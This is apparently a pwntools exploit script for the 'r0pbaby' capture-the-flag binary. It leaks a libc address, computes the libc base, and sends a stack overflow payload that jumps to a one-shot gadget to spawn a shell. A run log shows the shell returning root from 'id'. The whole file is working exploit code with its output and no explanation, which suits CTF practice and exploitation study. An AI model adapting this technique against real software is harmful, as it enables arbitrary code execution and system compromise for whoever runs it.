from pwn import *

local = False

if local:
	r = process('./ropbaby')
	context.log_level = 'debug'
	context.terminal = ['tmux', 'sp', '-h' ]
	bin = ELF('./ropbaby')
	lib = ELF('./libc-2.27.so')
	#gdb.attach(r)

else:
	r = process('./ropbaby')
	bin = ELF('./ropbaby')
	lib = ELF('./libc-2.27.so')



def getlibc():
	r.sendlineafter(': ', '1')

def getaddr(idx):
	r.sendlineafter(': ', '2')
	r.sendlineafter('Enter symbol:', idx)

def overflow(size,payload):
	r.sendlineafter(': ', '3')
	r.sendlineafter(': ', str(size))
	r.sendline(payload)

def exit():
	r.sendlineafter(': ', '4')


getlibc()
out = r.recvline()
leak = int(out.strip('libc.so.6: ').strip('\n'),16)
log.info('Libc leak @ {:#x}'.format(leak))
libc_base = leak - 0x7c34f0
log.success('Libc base address @ {:#x}'.format(libc_base))

getaddr('system')
r.recvuntil(': ')
addr_leak = int(r.recv(18),16)
log.success('System leak @ {:#x}'.format(addr_leak))

one_shot = libc_base + 0x4239e  #ONE_SHOT GADGET OFFSET
log.info('Crafting one shot gadget')

payload = 'A'*8
payload += p64(one_shot)

overflow(16, payload)

r.interactive()

'''
[+] Starting local process './ropbaby': pid 26390
[*] '/root/Escritorio/pwn-list/r0pbaby/ropbaby'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
[*] '/root/Escritorio/pwn-list/r0pbaby/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Libc leak @ 0x7f94db5e54f0
[+] Libc base address @ 0x7f94dae22000
[+] System leak @ 0x7f94dae64510
[*] Crafting one shot gadget
[*] Switching to interactive mode
1) Get libc address
2) Get address of a libc function
3) Nom nom r0p buffer to stack
4) Exit
: Bad choice.
$ id
uid=0(root) gid=0(root) grupos=0(root)
'''
